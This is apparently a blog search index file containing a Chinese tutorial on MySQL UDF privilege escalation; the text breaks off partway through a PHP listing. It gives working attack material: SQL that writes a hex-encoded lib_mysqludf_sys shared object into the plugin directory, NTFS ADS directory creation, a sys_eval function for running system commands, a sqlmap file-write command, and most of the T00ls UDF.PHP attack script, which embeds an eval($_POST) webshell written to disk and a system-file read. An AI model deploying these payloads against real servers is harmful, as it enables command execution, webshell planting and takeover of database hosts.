<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>msql数据库-udf-提权姿势学习</title>
      <link href="/2023/09/22/msql%E6%95%B0%E6%8D%AE%E5%BA%93-udf-%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/09/22/msql%E6%95%B0%E6%8D%AE%E5%BA%93-udf-%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>udf 即 用户自定义函数（User Defined Functions），在mysql中指代用户自己定义的函数。用户可以通过这样的方式来拓展数据库的功能，让数据库做到一些不能本地难以做到的功能。<a id="more"></a></p><h2 id="UDF提权条件"><a href="#UDF提权条件" class="headerlink" title="UDF提权条件"></a>UDF提权条件</h2><p>无论是win下的mysql服务还是linux下mysql服务，想要进行提权都需要满足以下4个条件：</p><p>(1)Mysql版本大于5.1版本，<code>udf.dll/udf.so</code>文件必须放置于MYSQL安装目录下的<code>lib\plugin</code>文件夹下。</p><p>(2)掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。</p><p>(3)可以将<code>udf.dll/udf.so</code>·文件写入到相应目录的权限。</p><h2 id="UDF提权过程"><a href="#UDF提权过程" class="headerlink" title="UDF提权过程"></a>UDF提权过程</h2><h3 id="1-信息获取"><a href="#1-信息获取" class="headerlink" title="1.信息获取"></a>1.信息获取</h3><p>获取数据库版本、数据位置以及插件位置(<code>lib\plugin</code>文件夹)等信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();//获取数据库版本 </span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();//获取数据库用户 </span><br><span class="line"><span class="keyword">select</span> @@basedir ;//获取安装目录 </span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%plugins%'</span>; //寻找mysql安装路径</span><br></pre></td></tr></table></figure><h3 id="2-在对应-lib-plugin-目录写入dll或so文件"><a href="#2-在对应-lib-plugin-目录写入dll或so文件" class="headerlink" title="2.在对应``lib\plugin`目录写入dll或so文件"></a>2.在对应``lib\plugin`目录写入dll或so文件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接 SELECT 查询十六进制写入</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c</span>... <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c</span>... <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.3\\lib\\plugin\\udf.dll'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码十六进制方式</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">unhex</span>(<span class="string">'7f454c4602...'</span>) <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">unhex</span>(<span class="string">'7f454c4602...'</span>) <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'C:\\Program Files\\MySQL\\MySQL Server 5.3\\lib\\plugin\\udf.dll'</span>;</span><br></pre></td></tr></table></figure><h5 id="写入dll或so文件模版"><a href="#写入dll或so文件模版" class="headerlink" title="写入dll或so文件模版"></a>写入dll或so文件模版</h5><h6 id="x32-win"><a href="#x32-win" class="headerlink" title="x32_win"></a>x32_win</h6><p>32位 udf.dll 文件写入sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  INTO DUMPFILE &#39;C:\\Program Files\\MySQL\\MySQL Server 5.3\\lib\\plugin\\udf.dll&#39;;</span><br></pre></td></tr></table></figure><h6 id="X64-win"><a href="#X64-win" class="headerlink" title="X64_win"></a>X64_win</h6><p>64位 udf.dll 文件写入sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT rogram Files\\MySQL\\MySQL Server 5.3\\lib\\plugin\\udf.dll&#39;;</span><br></pre></td></tr></table></figure><h6 id="X32-linux"><a href="#X32-linux" class="headerlink" title="X32_linux"></a>X32_linux</h6><p>32位linux so文件写入模板：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666fffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000</span> <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;</span><br></pre></td></tr></table></figure><h6 id="X64-linux"><a href="#X64-linux" class="headerlink" title="X64_linux"></a>X64_linux</h6><p>64位linux so文件写入模板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  INTO DUMPFILE &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;;</span><br></pre></td></tr></table></figure><h5 id="目录不存在情况"><a href="#目录不存在情况" class="headerlink" title="目录不存在情况"></a>目录不存在情况</h5><p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹。</p><p>在收集材料时发现win环境下还可以利用NTFS ADS流来创建文件夹的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir; &#x2F;&#x2F;查找到mysql的目录 </span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;; &#x2F;&#x2F;利用NTFS ADS创建lib目录 </span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;;&#x2F;&#x2F;利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure><h3 id="3-创建自定义函数"><a href="#3-创建自定义函数" class="headerlink" title="3.创建自定义函数"></a>3.创建自定义函数</h3><p>使用<code>CREATE FUNCTION</code>来创建 自定义函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">'udf.dll'</span>;</span><br></pre></td></tr></table></figure><p>创建后，我们可以用在``mysql.func`查询是否创建成功。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mysql.func;</span><br></pre></td></tr></table></figure><h3 id="4-调用函数"><a href="#4-调用函数" class="headerlink" title="4.调用函数"></a>4.调用函数</h3><p>这里我们定义创建的是<code>sys_eval</code> 函数，若在``mysql.func`查询成功则我们可以调用这个函数来执行系统命令（这个权限是最高系统权限）。使用方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select sys_eval(&#39;whoami&#39;);</span><br></pre></td></tr></table></figure><p>同时，我们在使用后，可以用<code>drop function</code>来删除自定义函数</p><h2 id="UDF-脚本工具"><a href="#UDF-脚本工具" class="headerlink" title="UDF 脚本工具"></a>UDF 脚本工具</h2><p>这个，是在国光师傅文章里看到的操作。</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>在有注入点情况下，我们可以直接sqlmap来写入链接库，模板如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://localhost:30008/"</span> --data=<span class="string">"id=1"</span> --file-write=<span class="string">"/Users/sec/Desktop/lib_mysqludf_sys_64.so"</span> --file-dest=<span class="string">"/usr/lib/mysql/plugin/udf.so"</span></span><br></pre></td></tr></table></figure><h3 id="UDF-PHP"><a href="#UDF-PHP" class="headerlink" title="UDF.PHP"></a>UDF.PHP</h3><p>在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候可以用一些网页脚本来辅助，这里找到一个win下的：</p><p>Win udf.php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;t00ls...................</span><br><span class="line">session_start();?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;T00ls UDF.PHP&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">input&#123;font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">function outfile()&#123;</span><br><span class="line">document.getElementById(&quot;sql2&quot;).value&#x3D; unescape(&quot;select%20%27%3C%3Fphp%20eval%28%24_POST%5B%5C%27pass%5C%27%5D%29%3F%3E%27%20into%20outfile%20%27d%3A%5C%5Cninty.php%27&quot;);</span><br><span class="line">&#125;</span><br><span class="line">function loadfile()&#123;</span><br><span class="line">document.getElementById(&quot;sql2&quot;).value &#x3D; unescape(&quot;select%20load_file%28%27c%3A%5C%5Cboot.ini%27%29&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_REQUEST[&#39;action&#39;]))</span><br><span class="line">$action &#x3D; $_REQUEST[&#39;action&#39;];</span><br><span class="line">else</span><br><span class="line">$action &#x3D; &#39;vConn&#39;;</span><br><span class="line">switch ($action) &#123;</span><br><span class="line">case &#39;vConn&#39;:</span><br><span class="line">vConn();</span><br><span class="line">break;</span><br><span class="line">case &#39;conn&#39;:</span><br><span class="line">conn();</span><br><span class="line">break;</span><br><span class="line">case &#39;exec&#39;:</span><br><span class="line">execsql();</span><br><span class="line">break;</span><br><span class="line">case &#39;install&#39;:</span><br><span class="line">install();</span><br><span class="line">break;</span><br><span class="line">case &#39;copy&#39;:</span><br><span class="line">cp();</span><br><span class="line">break;</span><br><span class="line">case &#39;cplug&#39;:</span><br><span class="line">cplug();</span><br><span class="line">break;</span><br><span class="line">case &#39;logout&#39;:</span><br><span class="line">logout();</span><br><span class="line">break;</span><br><span class="line">case &#39;func&#39;:</span><br><span class="line">func();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">function vConn() &#123;</span><br><span class="line">echo &#39;by ninty http:&#x2F;&#x2F;www.t00ls.net&#x2F;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;table&gt;&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;conn&quot;&gt;</span><br><span class="line">&lt;tr&gt;&lt;td&gt;ip:&lt;&#x2F;td&gt;&lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;host&quot; value&#x3D;&quot;localhost&quot;&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;tr&gt;&lt;td&gt;uid:&lt;&#x2F;td&gt;&lt;td&gt;&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;root&quot; name&#x3D;&quot;uid&quot;&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;tr&gt;&lt;td&gt;pwd:&lt;&#x2F;td&gt;&lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;pwd&quot;&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;tr&gt;&lt;td&gt;db:&lt;&#x2F;td&gt;&lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;db&quot; value&#x3D;&quot;mysql&quot;&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;tr&gt;&lt;td&gt;&lt;input type&#x3D;&quot;submit&quot;&#x2F;&gt;&lt;&#x2F;td&gt;&lt;td&gt;&amp;nbsp;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;form&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">function func()&#123;</span><br><span class="line">$conn &#x3D; conn(false);</span><br><span 